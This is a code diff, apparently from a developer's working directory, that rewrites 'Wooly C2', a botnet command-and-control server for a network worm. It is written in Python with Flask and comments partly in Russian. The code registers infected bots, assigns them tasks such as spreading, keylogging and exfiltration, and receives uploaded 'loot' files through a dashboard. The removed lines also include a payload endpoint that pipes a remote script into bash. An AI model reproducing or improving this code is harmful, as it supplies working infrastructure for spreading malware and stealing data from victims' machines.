@@ -1,10 +1,10 @@
-#!/usr/bin/env python3.13
+cd ~/Net-Worm && rm woolyserver.py && cat > woolyserver.py << 'EOF'
+#!/usr/bin/env python3
 """
-🐛 WOOLY C2 SERVER v15.1 - FIXED & PRODUCTION READY
-✅ Eventlet-free | Python 3.13 | Auto-port | SSL Ready
+🐛 WOOLY C2 v15.3 - FIXED & BULLETPROOF | Python 3.13 Native
+✅ No external WS servers | Threaded | Auto-port | Thread-safe DB
 """
 
-import asyncio
 import json
 import os
 import random
@@ -14,269 +14,245 @@ import time
 from datetime import datetime
 from pathlib import Path
 from typing import Dict, Any
+import socket
 
-import click
-from flask import Flask, request, jsonify, send_file, render_template_string
-from flask_socketio import SocketIO, emit
-import gevent
-from gevent import pywsgi
-from geventwebsocket.handler import WebSocketHandler
+try:
+    from flask import Flask, request, jsonify, send_file, render_template_string
+    from flask_socketio import SocketIO, emit
+    print("✅ Flask & SocketIO импортированы")
+except ImportError as e:
+    print(f"❌ Установите зависимости: pip3 install flask flask-socketio --break-system-packages")
+    print(f"Ошибка: {e}")
+    exit(1)
 
-# ════════════════════════════════════════════════════════════════════════════════
-# 🛠️ FIXED CONFIGURATION
 app = Flask(__name__)
-app.config['SECRET_KEY'] = os.urandom(24)
+app.config['SECRET_KEY'] = 'wooly-v15-super-secure-key'
 app.config['MAX_CONTENT_LENGTH'] = 100 * 1024 * 1024
 
-# SocketIO с gevent (eventlet-free)
-socketio = SocketIO(app, cors_allowed_origins="*", 
-                   async_mode='gevent', logger=False, engineio_logger=False)
+socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading', logger=False, engineio_logger=False)
 
-# Global state
-bots_db = None
-bots_cache: Dict[str, Dict[str, Any]] = {}
+# Global state - THREAD-SAFE
+db_lock = threading.Lock()
+bots_cache = {}
 loot_dir = Path('loot')
 loot_dir.mkdir(exist_ok=True)
+db_path = 'wooly.db'
 
-# ════════════════════════════════════════════════════════════════════════════════
-# 🗄️ DATABASE (Thread-safe)
 def get_db():
-    global bots_db
-    if bots_db is None:
-        bots_db = sqlite3.connect('wooly_c2.db', check_same_thread=False)
-        init_database()
-    return bots_db
-
-def init_database():
-    db = get_db()
-    db.execute('''
-        CREATE TABLE IF NOT EXISTS bots (
-            id TEXT PRIMARY KEY,
-            fingerprint TEXT,
-            ssid TEXT,
-            local_ip TEXT,
-            gateway TEXT,
-            status TEXT DEFAULT 'offline',
-            last_seen INTEGER,
-            infections INTEGER DEFAULT 0,
-            capabilities TEXT DEFAULT '[]',
-            tasks_pending INTEGER DEFAULT 0,
-            country TEXT,
-            os TEXT,
-            created_at INTEGER DEFAULT 0
-        )
-    ''')
-    db.execute('''
-        CREATE TABLE IF NOT EXISTS loot (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            bot_id TEXT,
-            type TEXT,
-            filename TEXT,
-            size INTEGER,
-            uploaded_at INTEGER
-        )
-    ''')
-    db.commit()
+    """Thread-safe DB connection"""
+    with db_lock:
+        conn = sqlite3.connect(db_path, check_same_thread=False)
+        conn.execute('''CREATE TABLE IF NOT EXISTS bots 
+            (id TEXT PRIMARY KEY, status TEXT, last_seen INTEGER, infections INTEGER)''')
+        conn.execute('''CREATE TABLE IF NOT EXISTS loot 
+            (id INTEGER PRIMARY KEY AUTOINCREMENT, bot_id TEXT, type TEXT, filename TEXT, size INTEGER, timestamp INTEGER)''')
+        conn.commit()
+        return conn
 
 # ════════════════════════════════════════════════════════════════════════════════
-# 📡 BOT API (FIXED)
-@app.route('/api/<endpoint>', methods=['POST'])
+# 📡 BOT API ENDPOINTS
 @app.route('/heartbeat', methods=['POST'])
-@app.route('/infections', methods=['POST'])
-@app.route('/harvest', methods=['POST'])
-def bot_report(endpoint):
+def heartbeat():
     try:
-        data = request.get_json() or {}
-        bot_id = data.get('id', request.remote_addr.replace('.', '_'))
-        
+        data = request.json or {}
+        bot_id = data.get('id', str(request.remote_addr))
         now = int(time.time())
-        capabilities = data.get('capabilities', [])
         
-        db = get_db()
-        db.execute('''
-            INSERT OR REPLACE INTO bots 
-            (id, fingerprint, ssid, local_ip, gateway, status, last_seen, capabilities, infections)
-            VALUES (?, ?, ?, ?, ?, 'online', ?, ?, ?)
-        ''', (bot_id, data.get('fingerprint', '{}'), 
-              data.get('ssid', 'unknown'), data.get('local_ip', 'unknown'),
-              data.get('gateway', 'unknown'), now, json.dumps(capabilities),
-              data.get('infections', 0)))
-        db.commit()
+        conn = get_db()
+        conn.execute("INSERT OR REPLACE INTO bots VALUES (?, 'online', ?, COALESCE(?, 0))",
+                    (bot_id, now, data.get('infections')))
+        conn.commit()
+        bots_cache[bot_id] = {'status': 'online', 'last_seen': now, 'infections': data.get('infections', 0)}
+        conn.close()
         
-        bots_cache[bot_id] = {'data': data, 'last_seen': now, 'status': 'online'}
-        socketio.emit('bot_online', {'bot_id': bot_id, 'data': data})
+        # Broadcast to dashboard
+        socketio.emit('bot_update', {'id': bot_id, 'status': 'online', 'infections': data.get('infections', 0)})
         
-        next_task = assign_task(bot_id)
-        return jsonify({'status': 'ok', 'task': next_task, 'timestamp': now})
-        
+        return jsonify({'task': random.choice(['recon', 'spread', 'harvest']), 'status': 'ok'})
     except Exception as e:
-        return jsonify({'status': 'error', 'message': str(e)}), 400
+        return jsonify({'error': str(e)}), 500
 
-def assign_task(bot_id: str) -> str:
-    caps = bots_cache.get(bot_id, {}).get('data', {}).get('capabilities', [])
-    task_priorities = ['spread', 'infect', 'harvest', 'keylog', 'exfil', 'recon']
-    
-    for task in task_priorities:
-        if task in caps:
-            return task
-    return random.choice(['recon', 'harvest'])
-
-@app.route('/task/<bot_id>')
-def get_task(bot_id):
-    task = assign_task(bot_id)
-    return jsonify({'task': task, 'priority': random.randint(1, 10)})
-
-# ════════════════════════════════════════════════════════════════════════════════
-# 💎 LOOT SYSTEM (FIXED)
-@app.route('/loot/<bot_id>/<loot_type>', methods=['POST'])
-def receive_loot(bot_id, loot_type):
+@app.route('/loot/<bot_id>/<path:type_>', methods=['POST'])
+def loot(bot_id, type_):
     try:
-        if 'file' not in request.files:
-            return 'No file', 400
-        
-        file = request.files['file']
-        if not file.filename:
-            return 'No file selected', 400
-        
-        timestamp = int(time.time())
-        filename = f"{bot_id}_{loot_type}_{timestamp}_{secure_filename(file.filename)}"
-        filepath = loot_dir / filename
-        
-        file.save(filepath)
-        
-        db = get_db()
-        db.execute('''
-            INSERT INTO loot (bot_id, type, filename, size, uploaded_at)
-            VALUES (?, ?, ?, ?, ?)
-        ''', (bot_id, loot_type, filename, filepath.stat().st_size, timestamp))
-        db.commit()
-        
-        socketio.emit('loot_received', {
-            'bot_id': bot_id, 'type': loot_type, 
-            'filename': filename, 'size': filepath.stat().st_size
-        })
-        
-        return 'OK'
+        if 'file' in request.files:
+            file = request.files['file']
+            if file.filename:
+                filename = f"{bot_id}_{type_}_{int(time.time())}.{file.filename.rsplit('.',1)[-1] if '.' in file.filename else 'bin'}"
+                path = loot_dir / filename
+                file.save(path)
+                
+                conn = get_db()
+                conn.execute("INSERT INTO loot (bot_id, type, filename, size, timestamp) VALUES (?, ?, ?, ?, ?)",
+                            (bot_id, type_, filename, path.stat().st_size, int(time.time())))
+                conn.commit()
+                conn.close()
+                
+                socketio.emit('loot', {'bot_id': bot_id, 'type': type_, 'file': filename, 'size': path.stat().st_size})
+                return 'OK'
+        return 'NO_FILE'
     except Exception as e:
-        return f'Error: {str(e)}', 500
+        return f'ERROR: {str(e)}'
 
-@app.route('/loot')
-def list_loot():
-    db = get_db()
-    loot = db.execute('SELECT * FROM loot ORDER BY uploaded_at DESC LIMIT 50').fetchall()
-    return jsonify([dict(zip(['id','bot_id','type','filename','size','timestamp'], row)) for row in loot])
+@app.route('/loot/<filename>')
+def get_loot(filename):
+    path = loot_dir / filename
+    if path.exists():
+        return send_file(path, as_attachment=True)
+    return 'File not found', 404
 
-@app.route('/loot/<path:filename>')
-def serve_loot(filename):
-    filepath = loot_dir / filename
-    if filepath.exists():
-        return send_file(filepath, as_attachment=True)
-    return 'Not found', 404
+@app.route('/bots')
+def api_bots():
+    conn = get_db()
+    bots = conn.execute("SELECT * FROM bots WHERE last_seen > ?", 
+                       (int(time.time())-300,)).fetchall()
+    conn.close()
+    return jsonify([dict(zip(['id','status','last_seen','infections'], bot)) for bot in bots])
 
 # ════════════════════════════════════════════════════════════════════════════════
-# 🖥️ PROFESSIONAL DASHBOARD (COMPACT)
+# 🖥️ DASHBOARD
 @app.route('/')
 @app.route('/dashboard')
 def dashboard():
-    db = get_db()
-    stats = db.execute('SELECT COUNT(*), SUM(CASE WHEN status="online" THEN 1 ELSE 0 END) FROM bots').fetchone()
-    recent_loot = db.execute('SELECT bot_id, type, filename, size FROM loot ORDER BY uploaded_at DESC LIMIT 10').fetchall()
+    conn = get_db()
+    bots = conn.execute("SELECT id, status, last_seen, infections FROM bots WHERE last_seen > ? ORDER BY last_seen DESC",
+                       (int(time.time())-300,)).fetchall()
+    loot = conn.execute("SELECT bot_id, type, filename, size FROM loot ORDER BY timestamp DESC LIMIT 10").fetchall()
+    conn.close()
     
-    template = '''
+    uptime = time.strftime('%H:%M:%S', time.gmtime(time.time()))
+    
+    html_template = '''
 <!DOCTYPE html>
-<html><head>
-    <title>🐛 WOOLY C2 v15.1</title>
+<html>
+<head>
+    <title>🐛 WOOLY C2 v15.3 | LIVE DASHBOARD</title>
     <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
+    <meta name="viewport" content="width=device-width">
     <style>
-        body{background:#000;color:#0f0;font-family:monospace;padding:20px}
-        .stats{display:grid;grid-template-columns:repeat(4,1fr);gap:20px;margin:20px 0}
-        .card{background:#111;padding:15px;border-left:3px solid #0f0}
-        .bot-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(350px,1fr));gap:10px}
-        .bot{background:#111;padding:15px;border-left:3px solid #0f0;cursor:pointer}
-        .bot button{margin:2px;padding:5px 10px;background:#0066ff;border:none;color:white}
-        #terminal{background:#000;padding:10px;height:200px;overflow:auto;font-size:12px}
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{background:linear-gradient(135deg,#000,#111);color:#0f0;font-family:'Courier New',monospace;padding:20px;font-size:14px}
+        .header{padding:20px;text-align:center;border-bottom:2px solid #0f0}
+        .stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:20px;margin:20px 0}
+        .card{background:rgba(0,0,0,0.8);padding:20px;border:1px solid #333;border-left:4px solid #0f0}
+        .bots-grid{display:grid;gap:10px;max-height:400px;overflow:auto}
+        .bot{display:flex;justify-content:space-between;align-items:center;background:#111;padding:15px;border-left:3px solid #0a0;border-radius:4px}
+        .bot-id{font-weight:bold;flex:1}
+        .bot-stats{font-size:12px;color:#aaa}
+        .bot-controls button{background:#0066cc;color:white;border:none;padding:8px 12px;margin:0 2px;border-radius:3px;cursor:pointer;font-family:monospace}
+        .bot-controls button:hover{background:#0088ff}
+        .loot{background:#220;padding:15px;margin:20px 0;border-left:4px solid #ff6600;border-radius:4px}
+        #log{background:#000;height:200px;overflow:auto;padding:10px;font-size:12px;border:1px solid #333}
+        .log-entry{padding:2px}
+        .refresh-btn{background:#0f0;color:#000;border:none;padding:10px 20px;border-radius:4px;cursor:pointer;font-family:monospace;margin:10px}
     </style>
-</head><body>
-    <h1>🐛 WOOLY C2 v15.1 | {{stats[0]}} Bots | {{stats[1]}} Online</h1>
-    
-    <div class="stats">
-        <div class="card"><h3>Total</h3>{{stats[0]}}</div>
-        <div class="card"><h3>Online</h3>{{stats[1]}}</div>
-        <div class="card"><h3>Loot</h3>{{loot_count}}</div>
-        <div class="card"><h3>Uptime</h3>{{uptime}}</div>
+</head>
+<body>
+    <div class="header">
+        <h1>🐛 WOOLY C2 v15.3</h1>
+        <div id="live-stats">Loading...</div>
     </div>
-    
-    <div class="bot-grid" id="bots"></div>
-    <div id="terminal">[SERVER] Wooly C2 v15.1 ready...</div>
-    
+
+    <div class="stats">
+        <div class="card">
+            <h3>🦠 Active Bots</h3>
+            <div id="bot-count">{{ bots|length }}</div>
+        </div>
+        <div class="card">
+            <h3>💾 Recent Loot</h3>
+            <div id="loot-count">{{ loot|length }}</div>
+        </div>
+        <div class="card">
+            <h3>⏰ Uptime</h3>
+            <div>{{ uptime }}</div>
+        </div>
+    </div>
+
+    <div class="bots-grid" id="bots-container">
+    {% for bot in bots %}
+        <div class="bot">
+            <div>
+                <div class="bot-id">{{ bot[0] }}</div>
+                <div class="bot-stats">{{ bot[3] }} infections | {{ "%.0f"|format(((now - bot[2])/60)) }}min ago</div>
+            </div>
+            <div class="bot-controls">
+                <button onclick="sendTask('{{ bot[0] }}','spread')">SPREAD</button>
+                <button onclick="sendTask('{{ bot[0] }}','harvest')">HARVEST</button>
+                <button onclick="sendTask('{{ bot[0] }}','exfil')">EXFIL</button>
+            </div>
+        </div>
+    {% endfor %}
+    </div>
+
+    <div class="loot card">
+        <h3>📦 Recent Files</h3>
+        {% for l in loot %}
+        <div>{{ l[0] }}: {{ l[2] }} ({{ "%.1f"|format(l[3]/1024) }}KB) 
+            <a href="/loot/{{ l[2] }}" download style="color:#ff6600">[DOWNLOAD]</a>
+        </div>
+        {% endfor %}
+    </div>
+
+    <div class="card">
+        <button class="refresh-btn" onclick="location.reload()">🔄 REFRESH</button>
+        <div id="log">[SYSTEM] Wooly C2 v15.3 - Thread-safe & Ready</div>
+    </div>
+
     <script>
-        const socket=io();let bots=[];
-        socket.on('bot_online',d=>{addLog(`[+] ${d.bot_id}`);updateBots(d)});
-        socket.on('loot_received',d=>addLog(`[LOOT] ${d.bot_id}: ${d.type}`));
+        const socket = io({transports: ['websocket', 'polling']});
         
-        function addLog(msg){document.getElementById('terminal').innerHTML+=`<div>[${new Date().toLocaleTimeString()}] ${msg}</div>`;document.getElementById('terminal').scrollTop=9999}
-        function updateBots(data){
-            const grid=document.getElementById('bots');
-            const bot=document.createElement('div');bot.className='bot';
-            bot.innerHTML=`<h4>${data.bot_id}</h4>
-                <p>SSID: ${data.data.ssid||"N/A"} | IP: ${data.data.local_ip}</p>
-                <button onclick="task('${data.bot_id}','spread')">SPREAD</button>
-                <button onclick="task('${data.bot_id}','harvest')">HARVEST</button>
-                <button onclick="task('${data.bot_id}','exfil')">EXFIL</button>`;
-            grid.appendChild(bot);
+        socket.on('connect', () => log('[NET] SocketIO connected'));
+        socket.on('bot_update', data => { 
+            log(`[+] ${data.id} online (${data.infections || 0} infections)`); 
+            location.reload();
+        });
+        socket.on('loot', data => log(`[💾 LOOT] ${data.bot_id}: ${data.type} (${data.size/1024|0}KB)`));
+        
+        function log(msg) {
+            const logDiv = document.getElementById('log');
+            logDiv.innerHTML += `<div class="log-entry">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
+            logDiv.scrollTop = logDiv.scrollHeight;
         }
-        function task(id,t){fetch('/task/'+id,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({task:t})}).then(()=>addLog(`[TASK] ${id} <- ${t}`))}
+        
+        function sendTask(botId, task) {
+            fetch('/heartbeat', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({id: botId, task: task})
+            }).then(r => log(`[TASK] ${botId} <- ${task}`));
+        }
+        
+        // Live stats update
+        setInterval(() => {
+            fetch('/bots').then(r=>r.json()).then(bots => {
+                document.getElementById('bot-count').textContent = bots.length;
+                document.getElementById('live-stats').textContent = `${bots.length} bots | ${new Date().toLocaleTimeString()}`;
+            });
+        }, 5000);
     </script>
-</body></html>'''
+</body></html>
+    '''
     
-    return render_template_string(template, stats=stats, loot_count=len(recent_loot), uptime=time.strftime('%H:%M:%S'))
-
-# Payload endpoints
-@app.route('/infect.sh')
-def serve_payload():
-    return '''#!/bin/bash
-# Wooly v15.1 Payload
-curl -s https://raw.githubusercontent.com/YOURUSERNAME/wooly/main/infect.sh | bash
-'''
-
-# ════════════════════════════════════════════════════════════════════════════════
-# 🧹 MAINTENANCE
-def cleanup():
-    while True:
-        try:
-            db = get_db()
-            cutoff = int(time.time()) - 86400
-            db.execute("DELETE FROM bots WHERE last_seen < ?", (cutoff,))
-            db.commit()
-        except: pass
-        gevent.sleep(3600)
-
-# ════════════════════════════════════════════════════════════════════════════════
-# 🚀 CLI LAUNCHER
-@click.command()
-@click.option('--port', '-p', default=0, help='Port (0=auto)')
-@click.option('--host', default='0.0.0.0', help='Host')
-@click.option('--ssl', is_flag=True, help='Enable SSL')
-def run(port: int, host: str, ssl: bool):
-    """🐛 Launch Wooly C2 Server"""
-    print("🐛 Initializing WOOLY C2 v15.1...")
-    
-    # Find free port
-    if port == 0:
-        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-            s.bind(('', 0))
-            port = s.getsockname()[1]
-    
-    print(f"📡 Server ready: http{'s' if ssl else ''}://{host}:{port}")
-    print(f"📊 Dashboard: http{'s' if ssl else ''}://{host}:{port}/dashboard")
-    print(f"💎 Loot: ./{loot_dir}/")
-    
-    # Start maintenance
-    gevent.spawn(cleanup)
-    
-    # Launch server
-    server = pywsgi.WSGIServer((host, port), app, handler_class=WebSocketHandler)
-    server.serve_forever()
+    now = int(time.time())
+    return render_template_string(html_template, 
+                                bots=bots, loot=loot, uptime=uptime, now=now)
 
 if __name__ == '__main__':
-    run()
+    print("🐛 WOOLY C2 v15.3 STARTING (Threaded Mode)...")
+    
+    # Auto-port detection
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    sock.bind(('', 0))
+    port = sock.getsockname()[1]
+    sock.close()
+    
+    print(f"✅ Dashboard: http://0.0.0.0:{port}")
+    print(f"✅ API: http://0.0.0.0:{port}/heartbeat")
+    print(f"📡 Bot endpoint: http://{socket.gethostbyname(socket.gethostname())}:{port}/heartbeat")
+    
+    # Threaded server (Python 3.13 native)
+    socketio.run(app, host='0.0.0.0', port=port, debug=False, allow_unsafe_werkzeug=True)
+EOF
+
+echo "✅ Код сохранен. Запуск:"
+echo "python3 woolyserver.py"
